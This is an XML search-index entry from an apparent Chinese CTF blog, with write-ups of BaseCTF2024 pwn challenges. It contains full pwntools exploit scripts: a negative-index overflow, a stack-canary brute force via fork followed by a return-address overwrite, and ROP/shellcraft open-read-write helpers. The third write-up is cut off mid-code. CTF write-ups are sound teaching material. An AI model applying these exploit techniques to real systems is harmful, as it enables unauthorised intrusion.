<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Pwn_2024_S_001_ZB</title>
    <link href="/2024/09/13/Pwn-2024-S-001-ZB/"/>
    <url>/2024/09/13/Pwn-2024-S-001-ZB/</url>
    
    <content type="html"><![CDATA[<h3 id="BaseCTF2024-–Pwn–五子棋"><a href="#BaseCTF2024-–Pwn–五子棋" class="headerlink" title="[BaseCTF2024]–Pwn–五子棋"></a><strong>[BaseCTF2024]–Pwn–五子棋</strong></h3><p><strong>链接：</strong> <a href="https://z-l-s-f.lanzouq.com/iVx4h2a119rg">https://z-l-s-f.lanzouq.com/iVx4h2a119rg</a></p><p><strong>check：</strong></p><p><img src="/2024/09/13/Pwn-2024-S-001-ZB/001.png" alt="001"></p><p>​64位程序，保护全开。</p><p><strong>ida分析关键漏洞点如下：</strong></p><p>​<img src="/2024/09/13/Pwn-2024-S-001-ZB/002.png" alt="002"></p><p>​在我们输入的时候没有做负数检查。</p><p><img src="/2024/09/13/Pwn-2024-S-001-ZB/003.png" alt="003"></p><p>​我们可以发现dword_4020和dword_4040是决定判断我们输赢的关键。经过查看我们可以发现dowrd_4020[1]为0，dword_4040[1]为-1，我们可以控制负整数溢出写dword_4040[1]为0，这样的话我们只需要第一次下棋到1,1的位置，第二次负整数溢出写dword_4040[1]为0，就可以下两步棋获得胜利。（第一次负整数溢出写dword_4040[1]为0有惊喜）</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>,<span class="hljs-number">48220</span>)<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="hljs-comment">#lib = cdll.LoadLibrary(None)</span><br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br><span class="hljs-comment">#context.arch = &#x27;amd64&#x27;</span><br><span class="hljs-comment">#context.os = &#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br><span class="hljs-comment">#gdbp(p,&quot;b *$rebase(0x1A51)&quot;)</span><br>sela(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-string">b&quot;1 1&quot;</span>)<br>sela(<span class="hljs-string">b&quot;:&quot;</span>,<span class="hljs-string">b&quot;-298 1&quot;</span>)<br><br>op()<br></code></pre></td></tr></table></figure><hr><h3 id="BaseCTF2024-–Pwn–没有-canary-我要死了"><a href="#BaseCTF2024-–Pwn–没有-canary-我要死了" class="headerlink" title="[BaseCTF2024]–Pwn–没有 canary 我要死了!"></a><strong>[BaseCTF2024]</strong>–Pwn–没有 canary 我要死了!</h3><p><strong>链接：</strong> <a href="https://z-l-s-f.lanzouq.com/ihYsL2a119pe">https://z-l-s-f.lanzouq.com/ihYsL2a119pe</a></p><p><strong>check:</strong></p><p><img src="/2024/09/13/Pwn-2024-S-001-ZB/004.png" alt="004"></p><p>​64位程序，保护全开。</p><p><strong>ida分析关键漏洞点如下：</strong></p><p><img src="/2024/09/13/Pwn-2024-S-001-ZB/005.png" alt="005"></p><p>​通过伪随机来使用fork创建新进程。</p><p><img src="/2024/09/13/Pwn-2024-S-001-ZB/006.png" alt="006"></p><p>​存在栈溢出。</p><p><img src="/2024/09/13/Pwn-2024-S-001-ZB/007.png" alt="007"></p><p>​存在后门函数。</p><p>​因为存在fork创建新线程，我们可以通过爆破的方式获得canary和后面函数的真实地址。</p><p><strong>exp：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span class="hljs-built_in">print</span>(b+<span class="hljs-string">&quot;:&quot;</span>+<span class="hljs-built_in">hex</span>(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> p.recv(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pre</span>(<span class="hljs-params">a</span>) : <span class="hljs-built_in">print</span>(p.recv(a))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">reu</span>(<span class="hljs-params">a,b=<span class="hljs-literal">False</span></span>) : <span class="hljs-keyword">return</span> p.recvuntil(a,drop=b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rel</span>() : <span class="hljs-keyword">return</span> p.recvline()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">se</span>(<span class="hljs-params">a</span>) : p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sea</span>(<span class="hljs-params">a,b</span>) : p.sendafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sel</span>(<span class="hljs-params">a</span>) : p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sela</span>(<span class="hljs-params">a,b</span>) : p.sendlineafter(a,b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">op</span>() : p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cp</span>() : p.close()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr64</span>() : <span class="hljs-keyword">return</span> u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr32</span>() : <span class="hljs-keyword">return</span> u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_T</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(re(<span class="hljs-number">14</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">raddr_A</span>() : <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(reu(<span class="hljs-string">b&quot;-&quot;</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">orw_rop64</span>(<span class="hljs-params">pop_rdi,pop_rsi,pop_rdx,flag_addr,open_addr,read_addr,write_addr</span>):<br>    orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(open_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(read_addr)<br>    orw+= p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="hljs-number">0x30</span>)<br>    orw+= p64(write_addr)<br>    <span class="hljs-keyword">return</span> orw<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getorw</span>(<span class="hljs-params">name,buf,Arch</span>) :<br>    sh=shellcraft.<span class="hljs-built_in">open</span>(name)<br>    sh+=shellcraft.read(<span class="hljs-number">3</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh+=shellcraft.write(<span class="hljs-number">1</span>,buf,<span class="hljs-number">0x30</span>)<br>    sh=asm(sh,arch=Arch)<br>    <span class="hljs-keyword">return</span> sh<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gdbp</span>(<span class="hljs-params">p,a=<span class="hljs-string">&#x27;&#x27;</span></span>) :<br>    <span class="hljs-keyword">if</span> a!=<span class="hljs-string">&#x27;&#x27;</span>:<br>        gdb.attach(p,a)<br>        pause()<br>    <span class="hljs-keyword">else</span> :<br>        gdb.attach(p)<br>        pause()<br><br>p = remote(<span class="hljs-string">&quot;challenge.basectf.fun&quot;</span>,<span class="hljs-number">40207</span>)<br><span class="hljs-comment">#p = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#elf = ELF(&quot;./pwn&quot;)</span><br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>lib = cdll.LoadLibrary(<span class="hljs-literal">None</span>)<br><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-g&quot;, &quot;9999&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><span class="hljs-comment">#p = process([&quot;qemu-mipsel-static&quot;,&quot;-L&quot;,&quot;./&quot;,&quot;./pwn&quot;])</span><br><br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><span class="hljs-comment">#elf.arch , elf.so</span><br><br>t = <span class="hljs-built_in">int</span>(time.time())<br>lib.srand(t)<br><br>canary1 = <span class="hljs-number">0</span><br>canary2 = <span class="hljs-number">0</span><br>canary3 = <span class="hljs-number">0</span><br>canary4 = <span class="hljs-number">0</span><br>canary5 = <span class="hljs-number">0</span><br>canary6 = <span class="hljs-number">0</span><br>canary7 = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    passwd = lib.rand()%<span class="hljs-number">50</span><br>    sela(<span class="hljs-string">b&quot;CTF\n&quot;</span>,stre(passwd))<br>    payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x68</span> + p8(<span class="hljs-number">0</span>) + p8(canary1)<br>    sea(<span class="hljs-string">b&quot;welcome\n&quot;</span>,payload)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;*** stack smashing detected ***: terminated\n&#x27;</span> <span class="hljs-keyword">in</span> rel():<br>        canary1 += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary1))<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    passwd = lib.rand()%<span class="hljs-number">50</span><br>    sela(<span class="hljs-string">b&quot;CTF\n&quot;</span>,stre(passwd))<br>    payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x68</span> + p8(<span class="hljs-number">0</span>) + p8(canary1) + p8(canary2)<br>    sea(<span class="hljs-string">b&quot;welcome\n&quot;</span>,payload)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;*** stack smashing detected ***: terminated\n&#x27;</span> <span class="hljs-keyword">in</span> rel():<br>        canary2 += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary2))<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    passwd = lib.rand()%<span class="hljs-number">50</span><br>    sela(<span class="hljs-string">b&quot;CTF\n&quot;</span>,stre(passwd))<br>    payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x68</span> + p8(<span class="hljs-number">0</span>) + p8(canary1) + p8(canary2) + p8(canary3)<br>    sea(<span class="hljs-string">b&quot;welcome\n&quot;</span>,payload)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;*** stack smashing detected ***: terminated\n&#x27;</span> <span class="hljs-keyword">in</span> rel():<br>        canary3 += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary3))<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    passwd = lib.rand()%<span class="hljs-number">50</span><br>    sela(<span class="hljs-string">b&quot;CTF\n&quot;</span>,stre(passwd))<br>    payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x68</span> + p8(<span class="hljs-number">0</span>) + p8(canary1) + p8(canary2) + p8(canary3)<br>    payload+= p8(canary4)<br>    sea(<span class="hljs-string">b&quot;welcome\n&quot;</span>,payload)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;*** stack smashing detected ***: terminated\n&#x27;</span> <span class="hljs-keyword">in</span> rel():<br>        canary4 += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary4))<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    passwd = lib.rand()%<span class="hljs-number">50</span><br>    sela(<span class="hljs-string">b&quot;CTF\n&quot;</span>,stre(passwd))<br>    payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x68</span> + p8(<span class="hljs-number">0</span>) + p8(canary1) + p8(canary2) + p8(canary3)<br>    payload+= p8(canary4) + p8(canary5)<br>    sea(<span class="hljs-string">b&quot;welcome\n&quot;</span>,payload)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;*** stack smashing detected ***: terminated\n&#x27;</span> <span class="hljs-keyword">in</span> rel():<br>        canary5 += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary5))<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    passwd = lib.rand()%<span class="hljs-number">50</span><br>    sela(<span class="hljs-string">b&quot;CTF\n&quot;</span>,stre(passwd))<br>    payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x68</span> + p8(<span class="hljs-number">0</span>) + p8(canary1) + p8(canary2) + p8(canary3)<br>    payload+= p8(canary4) + p8(canary5) + p8(canary6)<br>    sea(<span class="hljs-string">b&quot;welcome\n&quot;</span>,payload)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;*** stack smashing detected ***: terminated\n&#x27;</span> <span class="hljs-keyword">in</span> rel():<br>        canary6 += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary6))<br>        <span class="hljs-keyword">break</span><br><br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    passwd = lib.rand()%<span class="hljs-number">50</span><br>    sela(<span class="hljs-string">b&quot;CTF\n&quot;</span>,stre(passwd))<br>    payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x68</span> + p8(<span class="hljs-number">0</span>) + p8(canary1) + p8(canary2) + p8(canary3)<br>    payload+= p8(canary4) + p8(canary5) + p8(canary6) + p8(canary7)<br>    sea(<span class="hljs-string">b&quot;welcome\n&quot;</span>,payload)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;*** stack smashing detected ***: terminated\n&#x27;</span> <span class="hljs-keyword">in</span> rel():<br>        canary7 += <span class="hljs-number">1</span><br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary7))<br>        <span class="hljs-keyword">break</span><br><br>addr1 = <span class="hljs-number">0xAE</span><br>addr2 = <span class="hljs-number">0x12</span><br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    passwd = lib.rand()%<span class="hljs-number">50</span><br>    sel(stre(passwd))<br>    payload = <span class="hljs-string">b&quot;A&quot;</span>*<span class="hljs-number">0x68</span> + p8(<span class="hljs-number">0</span>) + p8(canary1) + p8(canary2) + p8(canary3)<br>    payload+= p8(canary4) + p8(canary5) + p8(canary6) + p8(canary7) + p64(<span class="hljs-number">0</span>)<br>    payload+= p8(addr1) + p8(addr2)<br>    sea(<span class="hljs-string">b&quot;welcome\n&quot;</span>,payload)<br>    line = rel()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;oh, welcome to BaseCTF\n&#x27;</span> <span class="hljs-keyword">in</span> line:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(addr2))<br>        addr2 += <span class="hljs-number">0x10</span><br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(line)<br>        <span class="hljs-keyword">break</span><br>op()<br></code></pre></td></tr></table></figure><hr><h3 id="BaseCTF2024-–Pwn–orz！"><a href="#BaseCTF2024-–Pwn–orz！" class="headerlink" title="[BaseCTF2024]–Pwn–orz！"></a><strong>[BaseCTF2024]–Pwn–orz！</strong></h3><p><strong>链接：</strong> <a href="https://z-l-s-f.lanzouq.com/isqWQ2a119qf">https://z-l-s-f.lanzouq.com/isqWQ2a119qf</a></p><p><strong>check:</strong></p><p><img src="/2024/09/13/Pwn-2024-S-001-ZB/008.png" alt="008"></p><p>​64位程序，除了canary其他保护全开。</p><p><strong>seccomp：</strong></p><p><img src="/2024/09/13/Pwn-2024-S-001-ZB/009.png" alt="009"></p><p><strong>ida漏洞分析如下：</strong></p><p><img src="/2024/09/13/Pwn-2024-S-001-ZB/010.png" alt="010"></p><p>​经典沙盒题，禁用orw和execve且为黑名单模式。我们可以使用openat+sendfile完成获得flag。</p><p><strong>exp：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from ctypes import *</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stre</span>(<span class="hljs-params">a</span>) : <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(a).encode()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ph</span>(<span class="hljs-params">a,b=<span class="hljs-string">&quot;addr&quot;</span></span>) : <span 